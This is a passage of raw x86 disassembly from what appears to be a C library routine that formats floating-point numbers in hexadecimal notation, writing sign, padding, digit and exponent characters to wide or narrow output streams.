test ebx, ebx
je 0x806a5f8
mov ecx, dword [var_118h]
mov edx, dword [var_8h]
test ecx, ecx
mov ebx, dword [edx + 4]
jne 0x806a2c5
test byte [edx + 0xc], 0x50
je 0x806a2c6
dec ebx
sub ebx, 3
test byte [var_161h], 0x20
jne 0x806a315
test ebx, ebx
jle 0x806a315
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a5dc
mov ecx, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], ecx
call fcn.08075900
cmp eax, ebx
je 0x806a30f
mov eax, 0xffffffff
add esp, 0x16c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_138h_2], ebx
mov eax, dword [var_118h]
test eax, eax
je 0x806a523
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a4f8
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a4dc
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_138h_2]
mov eax, dword [var_13ch_2]
mov esi, 2
test eax, eax
je 0x806a452
mov edx, dword [var_10ch_2]
mov edi, dword [var_13ch_2]
mov ecx, dword [edx]
add edx, 4
test edi, edi
mov dword [var_10ch_2], edx
je 0x806a429
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a414
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, esi
inc dword [var_138h_2]
dec esi
test eax, eax
jne 0x806a368
mov eax, dword [var_8h]
test byte [eax + 0xc], 0x20
je 0x806a3f0
test ebx, ebx
jle 0x806a3f0
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a3fb
mov edx, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], edx
call fcn.08075900
cmp eax, ebx
jne 0x806a2ff
add dword [var_138h_2], ebx
lea esi, [esi]
mov eax, dword [var_138h_2]
jmp 0x806a304
mov ecx, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], ecx
call fcn.08075680
jmp 0x806a3df
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806a39e
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a441
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a423
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806a423
mov eax, dword [var_108h_2]
mov edx, dword [var_13ch_2]
movsx ecx, byte [eax]
inc eax
test edx, edx
mov dword [var_108h_2], eax
je 0x806a4b3
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a49b
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, esi
inc dword [var_138h_2]
dec esi
test eax, eax
jne 0x806a452
jmp 0x806a3b1
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
lea esi, [esi]
inc eax
jmp 0x806a483
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a4cb
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a4b0
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806a4b0
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806a34f
jmp 0x806a2ff
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a511
mov byte [eax], 0x2d
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a34f
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x806a4ec
mov edx, dword [var_8h]
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x806a575
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a55b
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a551
mov dword [eax], 0x2b
jmp 0x806a349
mov dword [var_4h], 0x2b
jmp 0x806a4e4
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a56b
mov byte [eax], 0x2b
jmp 0x806a506
mov dword [var_4h], 0x2b
jmp 0x806a519
test al, 0x10
je 0x806a355
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a5b3
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a5a0
mov dword [eax], 0x20
jmp 0x806a349
mov edx, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [esp], edx
jmp 0x806a4e7
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806a5cc
mov byte [eax], 0x20
mov eax, dword [var_4h]
inc dword [eax + 0x14]
jmp 0x806a34f
mov dword [var_4h], 0x20
mov dword [esp], ecx
jmp 0x806a51c
mov eax, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], eax
call fcn.08075680
jmp 0x806a2fb
test byte [var_161h], 1
jne 0x806b450
mov eax, dword [var_18h]
xor ebx, ebx
xor edx, edx
mov dword [var_148h], edx
and eax, 0xfffff
mov esi, eax
mov eax, dword [var_1ch]
or esi, edx
or ebx, eax
mov dword [var_14ch], eax
mov edx, ebx
or edx, esi
sete al
movzx eax, al
mov dword [var_128h], eax
mov ecx, dword [var_8h]
xor eax, eax
cmp dword [ecx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_10h], eax
lea eax, [var_3ch]
mov dword [var_8h], eax
call fcn.0808d930
lea ecx, [var_1ch]
mov edx, dword [var_8h]
mov dword [var_114h], eax
xor eax, eax
cmp dword [edx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_8h], ecx
mov dword [var_10h], eax
call fcn.08063ca0
mov edi, eax
lea eax, [var_70h]
cmp dword [var_114h], eax
jbe 0x806a6bb
nop
sub dword [var_114h], 4
dec edi
mov edx, dword [var_114h]
cmp edx, eax
mov dword [edx], 0x30
mov byte [edi], 0x30
ja 0x806a6a0
movzx eax, word [var_16h]
shr ax, 4
and eax, 0x7ff
setne cl
mov esi, eax
add ecx, 0x30
test eax, eax
mov byte [var_129h], cl
jne 0x806b41c
mov eax, dword [var_128h]
mov dword [var_124h], 0
test eax, eax
jne 0x806a701
mov esi, 0x3fe
mov dword [var_124h], 1
mov eax, dword [var_128h]
test eax, eax
jne 0x806b401
cmp dword [var_40h], 0x30
lea ecx, [var_1ch]
lea eax, [var_3ch]
mov dword [var_110h], ecx
je 0x806b3ed
cmp dword [var_130h_2], 0xffffffff
je 0x806b3da
mov edx, dword [var_110h]
sub edx, edi
cmp dword [var_130h_2], edx
jge 0x806a758
mov ecx, dword [var_130h_2]
cmp byte [ecx + edi], 0x38
jg 0x806b22e
je 0x806b1db
lea eax, [var_c7h]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov dword [esp], esi
mov ebx, 0xcccccccd
call fcn.08063c00
lea ecx, [var_d8h]
mov dword [var_11ch], eax
nop
lea esi, [esi]
mov eax, esi
sub ecx, 4
mul ebx
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub esi, eax
test edx, edx
mov eax, dword [esi*4 + str.0123456789abcdefghijklmnopqrstuvwxyz]
mov esi, edx
mov dword [ecx], eax
jne 0x806a790
mov ebx, dword [var_118h]
xor eax, eax
mov dword [var_120h], ecx
test ebx, ebx
jne 0x806a7cb
mov ecx, dword [var_8h]
test byte [ecx + 0xc], 0x50
je 0x806a7d0
mov eax, 1
add eax, dword [var_130h_2]
lea ecx, [var_cch]
mov edx, dword [var_134h_2]
sub ecx, dword [var_11ch]
add eax, ecx
sub edx, eax
lea ecx, [edx - 0xa]
mov eax, edx
mov dword [var_134h_2], ecx
mov ecx, dword [var_130h_2]
test ecx, ecx
jle 0x806b1c0
mov ecx, dword [var_8h]
movzx ecx, byte [ecx + 0xc]
mov byte [var_161h], cl
mov edx, dword [var_13ch_2]
test edx, edx
jne 0x806b1b2
mov eax, dword [var_104h_2]
mov dword [esp], eax
call fcn.08053400
sub dword [var_134h_2], eax
test byte [var_161h], 0x20
jne 0x806a893
mov edx, dword [var_8h]
cmp dword [edx + 0x10], 0x30
je 0x806a893
mov eax, dword [var_134h_2]
test eax, eax
jle 0x806a893
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b190
mov ecx, dword [var_134h_2]
mov eax, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [var_8h], ecx
mov dword [esp], eax
call fcn.08075900
cmp eax, dword [var_134h_2]
jne 0x806a2ff
mov eax, dword [var_134h_2]
mov dword [var_138h_2], eax
mov eax, dword [var_118h]
test eax, eax
je 0x806b0d7
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b0ac
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b090
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_138h_2]
mov esi, dword [var_13ch_2]
test esi, esi
je 0x806b065
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b049
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
mov eax, dword [var_8h]
mov ebx, dword [var_13ch_2]
inc dword [var_138h_2]
mov ecx, dword [eax + 8]
add ecx, 0x17
test ebx, ebx
je 0x806b020
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b00b
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, dword [var_8h]
inc dword [var_138h_2]
test byte [eax + 0xc], 0x20
jne 0x806a956
cmp dword [eax + 0x10], 0x30
je 0x806af9a
mov eax, dword [var_13ch_2]
movsx edx, byte [var_129h]
test eax, eax
je 0x806af71
mov eax, dword [var_4h]
mov ecx, dword [eax + 0x58]
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806af5c
mov dword [eax], edx
add eax, 4
inc edx
mov dword [ecx + 0x10], eax
je 0x806a2ff
mov eax, dword [var_130h_2]
inc dword [var_138h_2]
test eax, eax
jle 0x806af4a
mov eax, dword [var_13ch_2]
lea esi, [var_100h_2]
mov ebx, 1
test eax, eax
jne 0x806a9c5
mov eax, dword [var_104h_2]
mov dword [esp], eax
call fcn.08053400
mov ebx, eax
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806aebb
mov eax, ebx
dec ebx
test eax, eax
je 0x806aa1b
mov eax, dword [var_13ch_2]
mov ecx, dword [esi]
add esi, 4
test eax, eax
je 0x806ae92
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ae7d
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806a9da
mov ecx, dword [var_130h_2]
test ecx, ecx
jle 0x806aadd
mov eax, dword [var_110h]
mov ebx, dword [var_130h_2]
mov esi, dword [var_130h_2]
mov edx, dword [var_13ch_2]
sub eax, edi
sub esi, eax
cmp ebx, eax
cmovg ebx, eax
test edx, edx
je 0x806adfa
mov eax, ebx
dec ebx
test eax, eax
je 0x806aaa6
mov eax, dword [var_114h]
mov ecx, dword [eax]
add eax, 4
mov dword [var_114h], eax
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806add1
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806adbc
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806aa59
test esi, esi
jle 0x806aadd
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806ada0
mov eax, dword [var_4h]
mov dword [var_8h], esi
mov dword [var_4h], 0x30
mov dword [esp], eax
call fcn.08075900
cmp eax, esi
jne 0x806a2ff
add dword [var_138h_2], esi
mov eax, dword [var_8h]
mov ecx, dword [eax + 8]
mov eax, dword [var_13ch_2]
add ecx, 0xf
test eax, eax
je 0x806ad77
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ad62
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
xor edx, edx
inc dword [var_138h_2]
mov eax, dword [var_13ch_2]
cmp dword [var_124h], 0
setne dl
test eax, eax
lea edx, [edx + edx + 0x2b]
je 0x806ad39
mov eax, dword [var_4h]
mov ecx, dword [eax + 0x58]
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806ad24
mov dword [eax], edx
add eax, 4
mov dword [ecx + 0x10], eax
inc edx
je 0x806a2ff
lea edx, [var_cch]
mov eax, dword [var_13ch_2]
inc dword [var_138h_2]
sub edx, dword [var_11ch]
test eax, eax
lea ebx, [edx + 5]
je 0x806ac93
mov eax, ebx
lea ebx, [edx + 4]
test eax, eax
je 0x806abd3
mov edx, dword [var_120h]
mov edi, dword [var_13ch_2]
mov ecx, dword [edx]
add edx, 4
test edi, edi
mov dword [var_120h], edx
je 0x806ac6a
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ac55
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [ebp - 0x138]
dec ebx
test eax, eax
jne 0x806ab86
mov eax, dword [var_8h]
test byte [eax + 0xc], 0x20
je 0x806a3f0
mov eax, dword [eax + 0x10]
cmp eax, 0x30
je 0x806a3f0
mov ecx, dword [ebp - 0x134]
test ecx, ecx
jle 0x806a3f0
mov edx, dword [ebp - 0x13c]
test edx, edx
je 0x806ac3a
mov ecx, dword [ebp - 0x134]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp + 8], ecx
mov dword [esp], eax
call fcn.08075900
cmp eax, dword [ebp - 0x134]
jne 0x806a2ff
mov eax, dword [ebp - 0x134]
add dword [ebp - 0x138], eax
jmp 0x806a3f0
mov edx, dword [ebp - 0x134]
mov ecx, dword [ebp + 8]
mov dword [esp + 4], eax
mov dword [esp + 8], edx
mov dword [esp], ecx
call fcn.08075680
jmp 0x806ac1d
mov edx, dword [ebp + 8]
mov dword [esp + 4], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806abc0
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ac82
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [ebp + 8]
inc dword [ecx + 0x14]
jmp 0x806ac64
movzx eax, cl
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804d840
jmp 0x806ac64
mov eax, ebx
lea ebx, [edx + 4]
test eax, eax
je 0x806abd3
mov eax, dword [var_11ch]
mov esi, dword [var_13ch_2]
movsx ecx, byte [eax]
inc eax
test esi, esi
mov dword [var_11ch], eax
je 0x806acfb
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ace9
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [ebp - 0x138]
dec ebx
test eax, eax
jne 0x806aca0
jmp 0x806abd3
mov edx, dword [ebp + 8]
mov dword [esp + 4], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806acd1
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ad13
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [ebp + 8]
inc dword [ecx + 0x14]
jmp 0x806acf8
movzx eax, cl
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804d840
jmp 0x806acf8
mov dword [var_4h], edx
mov edx, dword [var_4h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ab54
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806ad51
mov byte [eax], dl
mov eax, dword [var_4h]
inc dword [eax + 0x14]
jmp 0x806ab53
movzx eax, dl
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ad33
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ab0f
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ad8f
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806ad71
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ad71
mov edx, dword [var_4h]
mov dword [var_8h], esi
mov dword [var_4h], 0x30
mov dword [esp], edx
call fcn.08075680
jmp 0x806aacf
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806aa93
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ade9
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806adcb
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806adcb
mov eax, ebx
dec ebx
test eax, eax
je 0x806aaa6
mov eax, dword [var_13ch_2]
movsx ecx, byte [edi]
inc edi
test eax, eax
je 0x806ae54
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ae42
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806ae05
jmp 0x806aaa6
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ae2a
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ae6c
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806ae51
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ae51
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806aa08
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806aeaa
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806ae8c
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ae8c
mov eax, ebx
dec ebx
test eax, eax
je 0x806aa1b
mov eax, dword [var_104h_2]
mov esi, dword [var_13ch_2]
movsx ecx, byte [eax]
inc eax
test esi, esi
mov dword [var_104h_2], eax
je 0x806af21
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806af0f
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806aec6
jmp 0x806aa1b
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806aef7
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806af39
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806af1e
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806af1e
mov ecx, dword [var_8h]
test byte [ecx + 0xc], 8
je 0x806aa1b
jmp 0x806a9a0
mov dword [var_4h], edx
mov edx, dword [var_4h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806a986
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806af89
mov byte [eax], dl
movzx eax, dl
mov edx, dword [var_4h]
inc dword [edx + 0x14]
jmp 0x806af6b
movzx eax, dl
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806af6b
mov edx, dword [var_134h_2]
test edx, edx
jle 0x806a956
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806afec
mov edx, dword [var_134h_2]
mov ecx, dword [var_4h]
mov dword [var_4h], 0x30
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075900
cmp eax, dword [var_134h_2]
jne 0x806a2ff
mov ecx, dword [var_134h_2]
add dword [var_138h_2], ecx
jmp 0x806a956
mov eax, dword [var_134h_2]
mov edx, dword [var_4h]
mov dword [var_4h], 0x30
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075680
jmp 0x806afcf
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806a937
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b038
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806b01a
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806b01a
mov dword [var_4h], 0x30
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806a8ff
jmp 0x806a2ff
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b07e
mov byte [eax], 0x30
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a8ff
mov dword [var_4h], 0x30
mov dword [esp], edx
call fcn.0804d840
jmp 0x806b059
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806a8cd
jmp 0x806a2ff
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b0c5
mov byte [eax], 0x2d
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a8cd
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x806b0a0
mov edx, dword [var_8h]
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x806b129
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b10f
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b105
mov dword [eax], 0x2b
jmp 0x806a8c7
mov dword [var_4h], 0x2b
jmp 0x806b098
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b11f
mov byte [eax], 0x2b
jmp 0x806b0ba
mov dword [var_4h], 0x2b
jmp 0x806b0cd
test al, 0x10
je 0x806a8d3
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b167
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b154
mov dword [eax], 0x20
jmp 0x806a8c7
mov edx, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [esp], edx
jmp 0x806b09b
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806b180
mov byte [eax], 0x20
mov eax, dword [var_4h]
inc dword [eax + 0x14]
jmp 0x806a8cd
mov dword [var_4h], 0x20
mov dword [esp], ecx
jmp 0x806b0d0
mov edx, dword [var_134h_2]
mov ecx, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075680
jmp 0x806a87b
sub eax, 0xb
mov dword [var_134h_2], eax
jmp 0x806a834
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
and edx, 8
je 0x806a834
jmp 0x806a812
mov eax, ecx
inc eax
cmp eax, edx
jl 0x806b22e
test ecx, ecx
jle 0x806b200
movsx eax, byte [ecx + edi - 1]
mov edx, eax
sub eax, 0x30
and edx, 1
cmp eax, 9
jbe 0x806b3cd
test edx, edx
je 0x806b22e
mov eax, dword [var_130h_2]
test eax, eax
jne 0x806a758
movsx eax, byte [var_129h]
mov edx, eax
sub eax, 0x30
and edx, 1
cmp eax, 9
jbe 0x806b3c0
test edx, edx
jne 0x806a758
mov ebx, dword [var_130h_2]
dec ebx
js 0x806b2a4
movzx edx, byte [ebx + edi]
cmp dl, 0x39
mov byte [var_155h], dl
je 0x806b3a8
mov eax, 0
mov dword [var_15ch], 0x80aad14
test eax, eax
je 0x806b26f
mov dword [esp], 5
call section.
mov dword [var_15ch], eax
mov ecx, dword [var_15ch]
mov edx, dword [ecx]
test edx, edx
je 0x806b373
movsx eax, byte [var_155h]
cmp dword [edx + eax*4], 0x65
jle 0x806b35a
mov byte [ebx + edi], 0x30
mov ecx, dword [var_114h]
mov dword [ecx + ebx*4], 0x30
dec ebx
jns 0x806b237
cmp byte [var_129h], 0x39
je 0x806b348
mov eax, 0
mov ebx, 0x80aad14
test eax, eax
je 0x806b2cd
mov dword [esp], 5
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b31c
movsx eax, byte [var_129h]
cmp dword [edx + eax*4], 0x65
jg 0x806b2eb
inc byte [var_129h]
jmp 0x806a758
mov eax, dword [var_124h]
mov byte [var_129h], 1
test eax, eax
je 0x806b314
add esi, 4
js 0x806a758
mov dword [var_124h], 0
jmp 0x806a758
add esi, 4
jmp 0x806a758
mov edx, 0
test edx, edx
je 0x806b341
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [ebx], eax
mov edx, eax
jmp 0x806b2d3
mov eax, dword [0x80a9ab4]
jmp 0x806b331
mov eax, dword [var_8h]
movzx eax, byte [eax + 8]
mov byte [var_129h], al
jmp 0x806a758
inc byte [ebx + edi]
mov eax, dword [var_114h]
inc dword [eax + ebx*4]
test ebx, ebx
jns 0x806a758
jmp 0x806b2a4
mov eax, 0
test eax, eax
je 0x806b3a1
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, dword [var_15ch]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [edx], eax
mov edx, eax
jmp 0x806b27f
mov eax, dword [0x80a9ab4]
jmp 0x806b388
mov edx, dword [var_8h]
mov ecx, dword [var_114h]
mov eax, dword [edx + 8]
mov dword [ecx + ebx*4], eax
movzx eax, byte [edx + 8]
mov byte [ebx + edi], al
jmp 0x806b366
test edx, edx
je 0x806a758
jmp 0x806b22e
test edx, edx
jne 0x806b22e
jmp 0x806b200
mov eax, dword [var_110h]
sub eax, edi
mov dword [var_130h_2], eax
jmp 0x806a758
sub eax, 4
dec dword [var_110h]
cmp dword [eax - 4], 0x30
je 0x806b3ed
jmp 0x806a725
cmp dword [var_130h_2], 0xffffffff
mov eax, 0
mov dword [var_110h], edi
cmovne eax, dword [var_130h_2]
jmp 0x806b3e2
cmp eax, 0x3fe
jle 0x806b438
sub esi, 0x3ff
mov dword [var_124h], 0
jmp 0x806a701
mov eax, 0x3ff
mov dword [var_124h], 1
sub eax, esi
mov esi, eax
jmp 0x806a701
mov ebx, dword [var_18h]
mov eax, dword [var_1ch]
xor edx, edx
mov dword [var_150h], edx
mov esi, ebx
mov dword [var_154h], eax
xor ebx, ebx
or ebx, eax
or esi, edx
mov edx, ebx
or edx, esi
sete al
movzx eax, al
mov dword [var_128h], eax
mov ecx, dword [var_8h]
xor eax, eax
cmp dword [ecx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_10h], eax
lea eax, [var_1ch]
mov dword [var_8h], eax
call fcn.08063ca0
lea ecx, [var_3ch]
mov edx, dword [var_8h]
mov edi, eax
xor eax, eax
cmp dword [edx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_8h], ecx
mov dword [var_10h], eax
call fcn.0808d930
mov dword [var_114h], eax
lea eax, [var_2ch]
cmp edi, eax
jbe 0x806b4fc
dec edi
mov byte [edi], 0x30
